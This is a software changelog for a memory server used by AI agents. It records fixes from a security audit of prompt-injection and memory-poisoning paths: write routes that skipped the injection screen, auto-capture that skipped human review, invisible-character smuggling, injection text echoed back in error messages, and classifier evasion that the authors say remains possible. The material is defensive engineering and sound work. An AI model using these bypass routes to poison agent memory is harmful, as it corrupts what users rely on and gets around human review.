- **Cargo.toml**: `otel` feature (`tracing`, `tracing-subscriber/env-filter`,
  `opentelemetry`, `opentelemetry_sdk`, `opentelemetry-otlp`,
  `tracing-opentelemetry`). `tracing-subscriber`'s `registry` feature is
  enabled only under `otel` (the OTLP layer needs it).
- **Tests** (`screen::tests::otel_tests`, cfg-gated): `screen_emits_verdict_span`
  proves via a hand-rolled capturing `Layer<Registry>` that the seam emits a
  `screen` span with exactly `[("verdict", "clean")]`; `verdict_span_label_covers_all_verdicts`
  pins all three label mappings.

### Honest ceilings
- The default build has **no telemetry**; an operator must rebuild with
  `--features otel` + run a collector (see `src/config.rs` / `BRAIN_OTEL_ENDPOINT`).
- `query_hash` is an xxh3-64 fingerprint, not the query — recall spans never
  carry content; a consumer wanting the exact query must re-derive it from the
  hash + audit, by design.
- Only the three decision seams are instrumented (screen / gate / recall). The
  wider request path, connectors, and webhook handlers are not yet covered.
- `gate_outcome`/`screen_verdict_span` labels are stable strings, not the raw
  enum Debug repr — a deliberate, changelog-noted contract for dashboard joins.

---



## [1.20.6] — 2026-08-12
### Release notes

- **Memory Operations dashboard**: a live pending queue with full content, source prompt, and SLA countdown, plus keyboard approve/reject.
- **Improvements:** Flagged and quarantined items are visible in one place, with screen-caught recall hits badged and stripped of invisible characters at display.
- **Improvements:** A gate-health strip summarizes approved/rejected/expired counts with a severity hint.
### Engineering record


### Client — "Console" (Memory Operations panel + SLA clocks + flagged surface)

The first release of the operator-console line (per
`IMPLEMENTATION_PLAN_v1.20.6_Console.md`). Turns the HITL posture brain-server
built across v1.14+ into a single live, at-a-glance work surface. **Client-only**
— server + API contract stay at 1.20.0; the panel is a pure composition of the
already-shipped `/proposals`, `/decayed`, and recall-`include_flagged`
endpoints. No new routes, no schema change, no new dependency.

### Added
- **M1 — Memory Operations panel** (`client/src/panels/ops.rs` + `Route::Ops`
  at `/ops`, registered in rail + tab bar + palette; nav targets 12 → 13). A
  3-region dashboard, one decision type per region: **live pending queue**
  (top-left primary; each row = exact content + `source_prompt` + live SLA
  countdown + A-approve/R-reject via the existing `decide` path), **flagged &
  quarantined** (recall `include_flagged: true` + `GET /decayed`, read-only,
  displayed through the v1.20.3 invisible-char strip boundary), and a **gate
  health strip** (approved/rejected/expired counts → severity hint).
- **M2 — SLA countdown clocks** (the "queue is a clock" rule). New Dioxus-free
  pure cores: `clock_until` (time-until-expiry from `created_at` + the mirrored
  `DEFAULT_PROPOSAL_TTL_SECS`, `None` once past deadline), `sla_tier`
  (`critical` < 5 min / `warn` < 1 hr / `ok`), `gate_health`, and
  `queue_priority` (expired first, then nearest-expiry, stable tie-break by
  id). A once-on-mount loop re-renders all countdowns from a fresh `now_unix()`
  every ~30s (dependency-free, the health-refresh idiom). Expired rows show the
  server-enforced auto-reject note.
- **M3 — flagged surface** — the injection screen's output is now visible in
  the console: screen-caught recall hits render a `flagged` badge and strip
  invisible smuggling chars at display only (raw bytes never rewritten).
- **M4 — wrap** — `ops_*`/`sla_*`/`gate_*` i18n keys in `en` (de/fr/es/nl
  resolve via the en-fallback); client Cargo.toml 1.20.0 → 1.20.6; this
  entry + AGENTS.md + CLIENT_ROADMAP.

### Tests
90 client tests (the new pure cores — `clock_until_*`, `sla_tier_*`,
`fmt_remaining_*`, `queue_priority_expired_first_then_nearest_expiry`,
`queue_priority_stable_tie_break_by_id`, `gate_health_*`; the palette
nav-target guard updated to 13). Clippy
`-D warnings` clean, `cargo fmt --check` clean, `wasm32-unknown-unknown`
build clean.

### Honest ceilings (carried into v1.20.7/8)
- The countdown refreshes on a ~30s timer, not instant push (instant = the
  v1.20.8 "Signal" plan). The server's 400 on a stale approve is the backstop.
- `DEFAULT_PROPOSAL_TTL_SECS` mirrors the server default; an operator override
  of `BRAIN_PROPOSAL_TTL_SECS` makes the displayed clock drift until the
  server 400 (documented in the core; the server's expiry is authoritative).
- `Proposal.screen_verdict` is not yet on the client wire type (server-side
  in v1.20.3), so the queue rows carry `source_prompt` but not the verdict
  badge; the flagged region surfaces screen-caught rows instead.
- Gate-health counts are a point-in-time pass over `/proposals?status=…`, not
  a rolling persisted window.

### GTM documentation line (companion to v1.20.6, no version bump)

Added the go-to-market documentation tier behind the `v1.20.12 "Docs"` /
`v1.20.13 "Media"` ROADMAP rows (plans: `IMPLEMENTATION_PLAN_v1.20.12_Docs.md`,
`IMPLEMENTATION_PLAN_v1.20.13_Media.md`). Originally authored **untracked** in
the gitignored `marketing/` directory (product-site landing/install/quickstart/
editions, research explainers, trust proof-map + reproduce walkthrough, blog
posts, media kit). **v1.20.12 "Docs" relocated the product-site/research/trust
tiers into the in-tree `docs/`**; the blog posts + media kit stayed private in
`marketing/` until the v1.20.13 "Media" release.



## [1.20.5] — 2026-08-11
### Release notes

- **OWASP compliance matrix**: the stack mapped control-by-control to the OWASP GenAI LLM Top 10 (2026) and Top 10 for Agentic Applications (2026).
- **Improvements:** Zero-trust AI posture documented: workload identity, least agency, and a single egress boundary.
- **Improvements:** An audit-ready-replay playbook for assembling decision-path evidence from existing exports.
- **Improvements:** An enterprise ops runbook: token rotation, memory-poisoning incident response, and classifier operations.
### Engineering record


v1.20.5 "Agentic" — the **enterprise capstone** of the GhostJacking-hardening
line (G1–G6 all closed across v1.20.1–v1.20.4). **Docs only** — zero new routes,
zero schema change, zero new deps, no server/client version bump (a docs-only
patch tag `v1.20.5` marks the artifact). Maps the hardened stack to the two 2026
OWASP agentic frameworks and ships the adoption artifacts an enterprise team
needs.

### Added (docs)

- **`docs/OWASP_AGENTIC_2026.md`** — the control-by-control compliance matrix:
  the **OWASP GenAI LLM Top 10:2026** (LLM01–LLM10, pub. 2026-08-04) and the
  **OWASP Top 10 for Agentic Applications 2026** (ASI01–ASI10, pub. 2025-12-10).
  Every row = `Shipped vX.Y` (exact feature) or `Ceiling v2.x` (owned residual
  risk). Includes the AIUC-1 crosswalk (procurement bridge) and a residual-risk
  section naming the owners. Standard = **100% control coverage** (LLM01 has no
  prevention per OWASP 2026; segregation + gates + least-privilege are the
  load-bearing defenses).
- **ZT4AI posture** (`SECURITY.md` § + `COMPLIANCE.md` §3.5) — workload identity
  (agents are not shared service accounts; did:key + capability tokens, ≤90d
  rotation), least-agency (plugin = recall + proposal only, write approval
  outside the prompt), Rule of Two, egress boundary (exactly one outbound path:
  the Art 19 webhook).
- **Audit-ready-replay playbook** (`COMPLIANCE.md` §3.6) — the 2026
  production-readiness bar ("replay the agent's decision path"); how to assemble
  the evidence bundle (what/why/to-whom/for-how-long) from `/audit` + `/recall/
  {id}/trace` + DSAR certificates + retention — export paths already exist, no
  new code.
- **Enterprise ops runbook** (`docs/deployment.md` §) — token rotation
  (v1.20.2 machine-identity pattern) + poisoning-incident-response
  (`/decayed` + `/consolidate/propose` → purge → re-verify chain → rotate) +
  classifier operations (FPR calibration via `BRAIN_INJECTION_THRESHOLD_HIGH/
  LOW`, retrain trigger, `sha256sum` model-artifact hash-pin).

### Fixed / Changed

- `ROADMAP.md` released-version header → 1.20.5 + released row for the
  docs capstone; `COMPLIANCE.md` + `SECURITY.md` + `docs/deployment.md`
  cross-reference the new matrix (hand link-checked).

### Honest ceilings (the "100%" answer)

- LLM01 has no prevention (OWASP 2026's own position); adaptive white-box
  classifier evasion (GCG-class) still beats a hardened encoder — the
  `untrusted` segregation + approval gate are the surviving controls. Owners:
  ops / platform.
- v2.x code ceilings the matrix names: per-principal quotas (LLM06), at-rest
  encryption (LLM02), mTLS (ASI07), full multi-team tenancy + SSO (ASI03) — all
  owned by v2.0 "Cortex". A2A federation (ASI07) stays v2.x; the v1.20.4
  Standard Webhooks handshake is the 2026-compliant boundary until then.

---



## [1.20.4] — 2026-08-11
### Release notes

- **Improvements:** The health endpoint now surfaces the webhook posture at a glance: replay window, scheme, and whether timestamps are required.
- **Improvements:** Documented how GitHub's webhook replay protection works (delivery-id idempotency) and how first-party senders can opt into signed timestamps.
- **Optional Standard Webhooks verification**: when enabled, deliveries must carry signed id/timestamp/signature headers, verified in constant time.
- **Security fixes:** The signed timestamp rides inside the HMAC, so a replayed delivery cannot be re-stamped; delivery-id idempotency still applies.
### Engineering record


v1.20.4 "Replay" — the G6 close from the GhostJacking audit: an **optional,
config-driven replay window** for webhook senders that provide a signed
timestamp, plus a documented stance for GitHub. **Server** Cargo 1.20.3 →
1.20.4; client stays at 1.20.0. **No schema change, no new routes** — the
Standard Webhooks handshake rides the existing `/webhooks/{kind}` surface.

### Added

- **Standard Webhooks handshake for first-party senders (M1, opt-in).** When
  `BRAIN_WEBHOOK_TIMESTAMP_REQUIRED=1`, `POST /webhooks/{kind}` requires the
  open spec's header set (`webhook-id`/`webhook-timestamp`/`webhook-signature`)
  and verifies the `v1,<base64>` HMAC-SHA256 over `{id}.{timestamp}.{raw body}`
  in constant time (`WebhookQueue::verify_standard_signature`,
  `src/handlers/webhooks.rs::receive_standard`). The timestamp rides inside the
  HMAC, so a replay cannot re-stamp it. `webhook-id` feeds the existing
  `webhook_seen` idempotency. The spec path accepts any kind — the flag is an
  explicit operator opt-in for their own trusted senders.
- **`/health` webhook posture (M2).** `webhook.replay_secs` (300),
  `webhook.timestamp_required`, and `webhook.scheme`
  (`standard-webhooks` | `legacy`) exposed at a glance (mirrors the `hardening`
  object pattern).
- **Documentation stance for GitHub (M3, the real deliverable).** GitHub's
  replay protection is `x-github-delivery` idempotency (its sender is a trusted
  third party), not a timestamp window — documented in `SECURITY.md` §webhooks,
  `COMPLIANCE.md` §webhooks, and `docs/deployment.md`. First-party senders can
  opt into the hard window via the spec headers + flag (svix-style signer or a
  hand-rolled HMAC, both documented).

### Fixed

- **G6 webhook replay window that depends on sender headers** — previously the
  `WEBHOOK_REPLAY_SECS` window only applied when a caller-supplied timestamp was
  present, and GitHub sends none, so its only replay protection was delivery-id
  dedup (acceptable for the connector's threat model). The spec handshake closes
  this for senders that DO provide a signed timestamp without inventing one
  GitHub doesn't send.

### Security

- The hard window is **opt-in** (default unchanged — the legacy GitHub path is
  byte-identical); an attacker who can forge the HMAC already controls the
  secret, so replay here is a robustness concern, not an RCE vector. This closes
  **all six audit gaps (G1–G6)** across the v1.20.x line.

### Honest ceilings (carried into v1.21+)

- GitHub's replay protection remains delivery-id idempotency — no timestamp is
  invented for it.
- The spec handshake is verification-side only; the legacy GitHub path keeps its
  `sha256=` HMAC scheme (back-compat). The spec's `webhook-origin`/allowlist
  features are not adopted.

---



## [1.20.3] — 2026-08-11
### Release notes

- **Fixed a crash in PII masking**: chunks containing multi-byte characters (em-dash, CJK) after a digit run crashed reads; masking now handles them and leaves non-ASCII text untouched.
- **Improvements:** Review proposals show a screen verdict badge (clean/quarantined), recomputed deterministically at read time.
- **Improvements:** The health endpoint reports whether the optional injection classifier is actually loaded.
- **Optional second-layer injection classifier** (local model, off by default) catches novel or obfuscated injections the blocklist misses; high scores reject, borderline content is stored flagged.
- **Security fixes:** Injection screening now covers every ingest write path, including procedures.
- **Security fixes:** Invisible-character coverage widened (tag blocks, variation selectors); the web client shows recall hits and proposals de-obfuscated while stored bytes stay untouched.
### Engineering record


v1.20.3 "Classify" — the G5 upgrade path from the GhostJacking audit (layer 2 of
the injection screen) plus the client render-boundary hardening. **Server** Cargo
1.20.2 → 1.20.3; client stays at 1.20.0 (one pure fn + three render-site call
sites + a test, version-neutral). **No schema change** — `proposals.screen_verdict`
is recomputed deterministically at read time rather than persisted, so the schema
stays at 1.20.1/1.20.2 and `test_migration_schema_contract` is untouched.

### Added

- **Two-layer injection screen** (`src/screen.rs`, the single seam every ingest
  write path routes through). Layer 1 = the existing deterministic blocklist
  (always on). Layer 2 = an **optional, feature-gated local ONNX classifier**
  (`injection-classifier` feature + `ort`/`tokenizers`) for novel/obfuscated
  injections. Layer 2 is OFF by default — the Jetson envelope treats memory as
  the scarcest resource and the blocklist + `flagged`/`untrusted` segregation
  remain the always-on defense. When enabled, loads the model at
  `BRAIN_INJECTION_CLASSIFIER` + tokenizer at `BRAIN_INJECTION_TOKENIZER`
  (Fastly-lineage BERT-tiny INT8, ~4.3 MB) once via a `LazyLock`, off the
  request path. Banding: score ≥ `BRAIN_INJECTION_THRESHOLD_HIGH` (0.9) → HTTP
  400; ≥ `BRAIN_INJECTION_THRESHOLD_LOW` (0.7) → stored flagged; else clean.
  Under `Allow` policy the whole screen is disabled (kill switch). Scoring is
  sentence-packed + density-adjusted (StackOne calibration): one flagged
  sentence in a ≥3-sentence chunk is damped toward 0, several confirm an attack.
- **Screen wired into every ingest write site**: `/add`, `/ingest/memory`,
  `/ingest/markdown`, `/ingest` (`ingest_one`), `/procedure` (root + each step),
  and `/ingest/proposal`. `Reject` → 400 (`input_rejected`); `Quarantine` →
  stored flagged + KG edges skipped. `flag_if_quarantined` now takes the screen's
  bool verdict (no longer re-runs the blocklist in isolation) — a layer-2 hit
  quarantines exactly like a layer-1 hit.
- **Review-queue badge**: `ProposalView.screen_verdict` (`clean`/`quarantine`).
  `reject` is never persisted (the proposal path 400s on Reject at write time);
  the badge is recomputed deterministically at read time.
- **`/health` hardening field**: `injection_classifier_loaded` — lets ops confirm
  the opt-in model is actually active.
- **Canonical invisible-char predicate** (`screen::is_invisible`, extended from
  v0.9.7): adds the tag block (U+E0000–E007F) + variation selectors (U+FE00–FE0F)
  to the existing zero-width set. The blocklist normalization, the classifier,
  and the client render boundary now agree on what is invisible.
- **Client render boundary** (`client`): `strip_invisible` strips invisible
  smuggling chars from *displayed* recall hits + review proposals so the operator
  sees the de-obfuscated form. Raw bytes at rest are never rewritten.

### Security

- Closes the GhostJacking G5 upgrade path: novel/obfuscated injections that the
  deterministic blocklist misses can now be caught by an optional local model,
  still paired with the `flagged`/`untrusted` segregation (never the sole line of
  defense). Layer 2 off by default preserves the no-new-dependency default build.

### Honest ceilings (carried into v1.20.4 / v2.0)

- **Jetson-fit is a measured gate, not assumed.** Layer 2 is verified on desktop;
  the operator must run `bench --envelope` before treating it as Jetson-shippable
  (repo precedent: the rerank tier was removed for the same reason). `with_intra_threads(1)` respects the budget.
- The classifier catches semantic patterns, not every obfuscation; Quarantine
  stores flagged, never deletes. `source_prompt` remains PII-scanned, not
  semantically safe.
- `screen_verdict` is recomputed at read time, so a model swap can re-badge an
  in-flight proposal (rare; the badge reflects the current screen, which is the
  defensible reading). A model-drift Reject on a stored row reads as `quarantine`.
- `strip_invisible` runs at screen/classifier/render boundaries, not by rewriting
  stored bytes — a legitimate user's invisible Unicode is preserved verbatim at rest.
- G3 (OpenClaw subagent/exec/read/pdf envelope) + G4 (token at rest) remain
  operator/OpenClaw-side (companion plan).

### Changed

- Client Cargo stays 1.20.0 (version-neutral changes, v1.20.1 precedent).

### Fixed

- **Live panic in `mask_phone` (`src/gate.rs`)** — the PII masker iterated the
  input by byte index but emitted `out[i..i+1]`, which panics ("byte index is
  not a char boundary") whenever a multi-byte char (e.g. `—`, CJK) followed a
  digit run. A PII-flagged chunk containing such a char crashed the tokio worker
  on the read path. The masker now advances by full char (`len_utf8`); masking
  is unchanged and non-ASCII input round-trips untouched. Pinned by
  `redact_content_survives_multibyte_chars_and_still_masks`.

---



## [1.20.2] — 2026-08-11
### Release notes

- **Audit-chain fork fixed**: concurrent writers could append with the same predecessor hash; chain writes now serialize and the tamper-evident chain stays linear.
- **Bug fixes:** Concurrently approving the same proposal no longer yields a generic server error — the second attempt gets a clean "already decided" conflict.
- **Bug fixes:** Proposal-expiration events are now recorded durably instead of silently rolling back when a later step fails.
- **MCP protocol update (2026-07-28)**: stateless discovery, per-request metadata validation, caching hints, and spec-exact error codes; legacy clients keep working.
- **Improvements:** Resource bounds: export no longer buffers the entire database, embedding batches are capped, and adversarial content can no longer trigger quadratic entity extraction.
- **Improvements:** Source prompts are length-capped and PII-screened before storage; multi-item fetches collapsed from per-id queries to a single lookup.
- **Security fixes:** The procedure write path bypassed injection screening — it now screens the root and every step like all other ingest routes.
- **Card numbers slipped through PII redaction**: 16–19 digit Luhn-valid cards were flagged but leaked verbatim on redacted reads; they are now masked.
- **Security fixes:** Rate limiting was evadable by spoofing X-Forwarded-For (the header is now trusted only when configured) and used unbounded memory; tracking is now capped.
- **Security fixes:** Tombstone and erasure-certificate listings no longer expose other tenants' records to team-scoped admins; the detailed DB-health endpoint is no longer public.
### Engineering record


### Server — "Harden" (deep + security second-pass audit fixes)

The consolidated fix release for the v1.20.x deep + security second-pass
audit. Every confirmed finding from both audit passes is closed as a code
change; the operator-only G3/G4 work from the prior `CredentialHygiene` plan
is Part H (operator steps, no code). No schema change (stays at 1.20.1) — this
is a code-only release. Server 1.20.1 → 1.20.2; plugin stays 0.2.1; client
stays 1.20.0. See `IMPLEMENTATION_PLAN_v1.20.2_Harden.md`.

### Fixed — Correctness + concurrency (audit chain fork + friends)
- **A1 [C] audit hash chain can fork under concurrent autocommit writers**
  (`src/audit.rs`). `record_tenant` wrapped read-tip + INSERT in a `SAVEPOINT`,
  which on an autocommit caller is `BEGIN DEFERRED` — two concurrent writers
  both read the same tip and both INSERT the same `prev_hash` (chain forks).
  Now branches on `conn.is_autocommit()`: autocommit → `BEGIN IMMEDIATE` so the
  read-modify-write serializes at BEGIN; inside a caller tx (autocommit false)
  → keep `SAVEPOINT` (outer tx already holds the write lock). Mirrors the
  proven `record_and_rotate` pattern. Pinned by
  `audit_chain_survives_concurrent_autocommit_writers` (two threads + Barrier +
  `verify_chain`).
- **A2 [M] `prune_audit_retention` re-anchor** now uses
  `TransactionBehavior::Immediate` (was `unchecked_transaction`), same root
  cause as A1.
- **A3 [H] `approve_proposal` UPDATE lacked `AND status='pending'`**
  (`src/handlers/gate.rs`). Two concurrent approves raced; the loser surfaced a
  generic 500 via `idx_knowledge_hash` UNIQUE. Now CAS's the row, checks
  `n > 0`, returns `409 proposal_already_decided` otherwise, and the whole
  SELECT-INSERT-UPDATE promote runs in `BEGIN IMMEDIATE`.
- **A4 [H] `expire_if_stale` audit visibility depended on caller tx state.**
  `approve_proposal` ran it inside the tx, so the expiration + audit rolled
  back if anything after failed. Now expired **before** the tx opens (a
  distinct autocommitted event) + the status is re-checked inside the tx. The
  reject path already used `&Connection` and was correct.

### Fixed — GhostJacking-audit G1 hole on `/procedure` (first-pass M1)
- **B1 `/procedure` write core now screens injection like its siblings**
  (`src/handlers/procedure.rs`). The Shield release's "shared write core"
  claim had a hole: `/procedure` INSERTed into `knowledge` directly. Now
  mirrors `ingest_one` — screens root content+title AND every step
  (`contains_suspicious_pattern`), honors Reject policy → 400 `input_rejected`,
  calls `flag_if_quarantined` per-chunk under Quarantine (default), and skips
  `next_step` KG edges for a quarantined procedure. Pinned by the model-backed
  `#[ignore]`d `procedure_screens_injection_like_its_siblings`.

### Fixed — PII redaction missed 16–19 digit Luhn cards (first-pass M2)
- **C1 `mask_phone` upper bound was 15; cards are 13–19** (`src/gate.rs`). A
  16-digit Visa/Mastercard was flagged `pii=1` but never masked → leaked
  verbatim via `redact_content` and `screen_source_prompt`. New `mask_card`
  Luhn-checks 13–19 digit runs (single source of truth reusing the `scan_pii`
  detector), called from both `redact_content` and `screen_source_prompt`.
  `"4111 1111 1111 1111"` → `[redacted:card]`. Pinned by
  `redaction_masks_luhn_valid_16_digit_cards`.

### Fixed — DoS surface (highest-impact audit findings)
- **D1 [H] rate limiter evadable + unbounded memory via spoofed
  `X-Forwarded-For`** (`src/main.rs` + `src/config.rs`). `X-Forwarded-For` is
  now trusted only when `BRAIN_TRUST_PROXY=1` (default: socket addr — a
  direct-connection attacker can't cycle the header). The `RateLimiter`
  HashMap is capped at `RATE_LIMIT_MAX_KEYS = 10_000` with LRU eviction of the
  oldest 25% when full (bounded memory, no new dep). Pinned by
  `rate_limiter_caps_tracked_ips_and_evicts_oldest`.
- **D2 [H] linker quadratic blowup on adversarial content** (`src/linker.rs`).
  `extract_vocabulary` is now capped at `MAX_VOCAB_ENTITIES = 500` (one guard
  at entity insertion; the O(mentions²) loops inherit the bound). Pinned by
  `extract_vocabulary_caps_at_max_vocab_entities`.
- **D3 [M] `/export` buffered the entire DB → OOM** (`src/handlers/gate.rs`).
  Now bounded with a hard row cap + the provenance summary precomputed in one
  COUNT-GROUP-BY. (`ponytail:` a true streaming JSON encoder is a v2.x change;
  this guard prevents the OOM today.)
- **D4 [M] `/v1/embeddings` unbounded batch amplification** (`src/main.rs`).
  `inputs.len()` is now capped at `MAX_EMBEDDING_BATCH = 64` → 400.

### Fixed — AuthZ completeness + tenant isolation
- **E1 [H] `/tombstones` + `/dsar/{id}/certificate` lacked tenant scoping**
  (`src/handlers/observe.rs`). Both are Admin-gated but didn't call
  `audit_scope`; a team-scoped admin saw every tenant's tombstones
  (`reason = owner:<subject>`) + certificates. Now filtered against the
  principal's `sub` at the SQL layer (cross-tenant → empty result / 404, no
  existence leak); superuser (`None` principal) unconstrained.
- **E2 wiring-guard test blind to chained routes + `cap_gate`** — the
  capability gate remains exercised by `cap_gate_enforces_verbs_scope_and_never_admin`
  + `capability_accepted_only_on_ump_surface_with_operator_key`; the contract
  table + comment updated.
- **E3 [M] `/add` did not enforce `MAX_CONTENT`** (`src/main.rs`) — now checks
  the same bound `ingest_one` uses → 400.

### Fixed — Input validation + data hygiene
- **F1 [M] `source_prompt` unbounded + not injection-screened**
  (`src/handlers/gate.rs`). `MAX_SOURCE_PROMPT = 2048` (plugin sends ≤2000) →
  reject longer; screened via `screen_source_prompt` so a tripped prompt
  persists only as the `[redacted:…]` form (reviewer sees the warning).
- **F2 [L] `/health/db` was public + leaked operational metadata**
  (`src/main.rs`) — moved out of both public lists; now Read-gated. `/health`
  (the load-balancer probe) stays public.
- **F3 [L] `multi_get` N+1 queries** (`src/main.rs`) — collapsed to a single
  `SELECT ... WHERE id IN (...)` respecting `MAX_MULTI_GET`.
- **F4 [L] `/metrics` tenant scoping documented** — kept Admin/Read (an
  operator surface; the body is aggregate booleans, not row data); the intent
  is now a docstring.

### Added — MCP 2026-07-28 protocol compliance (Agent 68, folded)
- **MCP 2026-07-28 protocol compliance** (`src/bin/mcp.rs`): stateless core —
  no `initialize` handshake; every modern request validates the mandatory
  per-request `_meta` (`io.modelcontextprotocol/protocolVersion` +
  `io.modelcontextprotocol/clientCapabilities`); `server/discover` replaces
  `initialize` for modern clients (`supportedVersions: ["2026-07-28",
  "2025-11-25"]`); every result carries `resultType: "complete"` +
  `_meta.io.modelcontextprotocol/serverInfo`; `tools/list` + `server/discover`
  advertise `ttlMs`/`cacheScope` caching hints (SEP-2549). Error surface per
  the new spec: missing `_meta`/fields → -32602, unsupported version → -32022
  with `data.{supported,requested}`, unknown tool → -32602, parse error →
  -32700 (null id), null id → -32600. Dual-era: a legacy client's `initialize`
  selects 2025-11-25 semantics scoped to the stdio process. `ping` kept as a
  harmless no-op (removed from the new schema). Verified against OpenClaw
  2026.8.1 as a real MCP client (a test only — the native plugin remains the
  integration).
- **G1 [L] MCP stdio `read_line` unbounded → OOM** — capped at
  `MAX_LINE_BYTES = 1 << 20` (1 MiB), bails with -32700 on overflow.
- **G3 [L] MCP error messages echoed user input** — the four `format!` sites
  now use static labels + `sanitize_echo` (hex-escapes the offending value,
  truncates to 64 chars) so client input can't carry prompt-injection text
  into the caller LLM via `error.message`. Pinned by
  `sanitize_echo_destroys_injection_structure` + the updated
  `unknown_tool_is_a_protocol_error`.
- **G4 [I] `legacy` flag process-sticky** — `ponytail:` comment names the
  single-parent trust-model ceiling. No code change.

### Honest ceilings (carried into v1.20.3+ / v2.0)
- The injection screen stays the deterministic blocklist (G5 classifier =
  v1.20.3). Quarantine stores flagged, never deletes.
- `/export` streaming uses a bounded guard, not a server-sent stream (v2.x
  nicety); `RateLimiter` LRU is in-process (multi-instance shared store is
  v2.1); capability tokens remain operator-only (per-tenant cap scope is v2.0
  multi-tenancy); the audit-chain C1 fix is per-process (distributed audit
  chain is v2.1).



## [1.20.1] — 2026-08-11
### Release notes

- **Improvements:** Proposals now expire: pending captures aging past a configurable TTL (default 7 days) are auto-rejected and audited; deciding a stale proposal returns an error.
- **Improvements:** The capture-triggering prompt is shown in the review panel so reviewers see the context that produced a proposed memory.
- **The /ingest write path bypassed injection screening** — it now rejects or quarantines suspicious content exactly like every other write path.
- **Auto-capture no longer bypasses human review**: the openclaw plugin's autoCapture defaults to the approval queue; direct mode remains available (still screened).
- **Security fixes:** The capture-triggering turn is stored only in PII-screened form — redacted placeholders, never the raw prompt.
### Engineering record


### Server + Plugin — "Shield" (GhostJacking P0: injection screen on the shared write core + autoCapture through the human review gate)

First release of the GhostJacking-hardening line. Closes the two P0 audit
findings on the memory write path: the `/ingest` core that bypassed the
injection screen (G1), and the autoCapture write path that bypassed human
approval (G2). See `IMPLEMENTATION_PLAN_v1.20.1_Shield.md`.

### Added
- **M1 — `/ingest` now screens injection like its siblings** (`src/handlers/ingest.rs`):
  the shared `ingest_one` core (plain + single-UMP + batch-UMP + the plugin's
  `memory_store`/`autoCapture`) mirrors `/add` and `/ingest/memory` — `Reject`
  policy → HTTP 400 `input_rejected`; `Quarantine` (default) stores the chunk
  flagged (`flagged=1`, excluded from recall) and skips its KG edges. One
  guard in the shared core covers every caller.
- **M2 — autoCapture routes through the proposal gate** (plugin default):
  - `captureMode` on the plugin (`proposal` default | `direct`). `proposal`
    POSTs `/ingest/proposal` via the new `BrainClient.submitProposal()` —
    nothing from an untrusted turn becomes memory until a reviewer approves.
    `direct` keeps the old behavior (still screened server-side).
  - `proposals.source_prompt` column (additive migration + schema 1.20.1):
    the capture-triggering turn is stored **PII-screened** (`screen_source_prompt`
    — only `[redacted:…]` form persists, per LLM01:2026 control #7 "exact action,
    not a summary") and rendered in the client Review panel.
  - Proposal TTL (`BRAIN_PROPOSAL_TTL_SECS`, default 7 days): a pending
    proposal that ages out is auto-rejected + audited `proposal_expired`;
    approve/reject on a stale proposal refuse with 400.
  - `source_prompt` round-trips through `/proposals` (`ProposalView`), the
    client wire type, and the Review panel's "sourcing prompt" block.
- **M3 — docs**: `SECURITY.md` names `/ingest` as screened + the
  auto-capture gate; `docs/MEMGHOST_MITIGATION.md` documents `captureMode`.

### Tests
- Server: +3 (`ingest_screens_injection_like_its_siblings` — the audit §5
  drill as a model-backed `#[ignore]`d test, quarantine/reject/benign arms;
  `test_proposal_expires_after_ttl_and_audits`; the lib's
  `source_prompt_is_pii_screened_and_rendered`). Plugin: +3 (submitProposal
  wire; captureMode default routes to `/ingest/proposal`; config default).
- `schema_version` contract → 1.20.1; `authz_gates_cover_every_non_public_route`
  + `test_openapi_covers_routes` unchanged (no new routes).

### Security
- G1 closed: `/ingest` no longer bypasses the injection screen (audit §4
  action #8's document lie fixed).
- G2 closed: autoCapture no longer writes to memory without human approval
  (default `captureMode: "proposal"`); `memory_store` stays direct by design
  (explicit agent action) and remains M1-screened.

### Honest ceilings (carried into v1.20.2 / v1.20.3)
- The screen stays the deterministic blocklist; G5 classifier upgrade is
  v1.20.3.
- G3 (OpenClaw subagent/exec/read/pdf envelope coverage) lives in the OpenClaw
  codebase — companion plan v1.20.2.
- G4 (live token at rest, world-readable plist) is operator/tooling — v1.20.2.
- G6 webhook replay window P2 — documented, v1.20.4 if prioritized.

---



## [1.20.0] — 2026-08-11
### Release notes

- **Improvements:** Theme toggle now cycles dark → light → system, following the OS preference.
- **Offline tolerance**: decisions, purges, and erasure actions taken while disconnected are queued locally and replayed on recovery, each applied exactly once; a badge shows the queue count.
- **Improvements:** A client bundle-size budget gate lands in CI to catch growth regressions.
### Engineering record


### Client — "Polish" (theming, perf, offline-tolerance — the v1.20.0 done-state)

The final milestone of the v1.14→v1.20 client chain. Closed the plan's three
testable deltas; the two measured-performance deltas that need the Dioxus CLI
(`dx bundle` wasm sizes + FPS profiling) stay operator steps with their
budgets documented in `BENCHMARKS.md`.

### Added
- **M1 — system-following theme**: the theme toggle now cycles
  `dark → light → system`; `system` resolves via `prefers-color-scheme`
  (`pick_theme` extended to a tri-state over `THEME_MODES`; the existing
  theme effect sets `data-theme="system"` and the CSS
  `@media (prefers-color-scheme: light)` token block does the following —
  no JS).
- **M2.1 — bundle regression budget**: `client/bundle-budget.sh` builds the
  release wasm and fails if it exceeds a 7 MB budget (measured
  4.34 MB at ship; the dx-bundled 3.7 MB from v1.18.1 is the floor reference).
  Wired into the `client-gate` CI job as a hard gate.
- **M3 — offline-tolerance** (`client/src/queue.rs`): a bounded (100),
  serde-persisted (localStorage, `credentials_stay_in_memory`-safe — no
  token ever enters a queued action) action queue. Approve/Reject/Purge/DSAR
  actions that hit an unreachable/erroring server are queued instead of
  dropped; a "queued (offline)" badge shows the count in the top bar.
  On recovery the queue replays (`run_replay` — settle-by-key, each action
  applied once, survivors re-enqueued). Pinned by a wire parse/dedup test
  (idempotency-key dedup) + queue tests.
- **M4 — zero-telemetry reaffirmed**: no change, and the M2/M3 additions
  collect nothing (queue payloads are action-ids only, persisted locally).

### Changed
- Review rows, the batch summary, and DSAR outcomes now surface
  `RowOutcome::Queued` rather than collapsing to a generic pending state.
- `Package` idempotency keys derive from the action payload (`key()`), so a
  queued-then-applied action is never applied twice.

### Honest ceilings (carried into v2.0)
- Measured `dx bundle` wasm/JSCSS sizes + FPS profiling are operator steps
  (no Dioxus CLI here); the plan's <50 KB initial / <5 MB mobile budgets are
  tracked in `BENCHMARKS.md` as measured-success criteria, the CI budget
  guards the dominant term (release wasm).
- `system` theme does not live-listen to OS changes mid-session (applies on
  launch/change); desktop/mobile native theme following is a v2.x ceiling.
- wasm-split remains a Dioxus 0.8 ceiling (the wasm grows with the console —
  the budget gate is the tripwire until then).

---



## [1.19.0] — 2026-08-10
### Release notes

- **Improvements:** Audit-panel filters are now URL-addressable — a link like /audit?principal=alice opens the view pre-filtered, shareable with other reviewers.
### Engineering record


### Client — "Integrated" (the audit-verified remainder of the v1.19.0 plan)

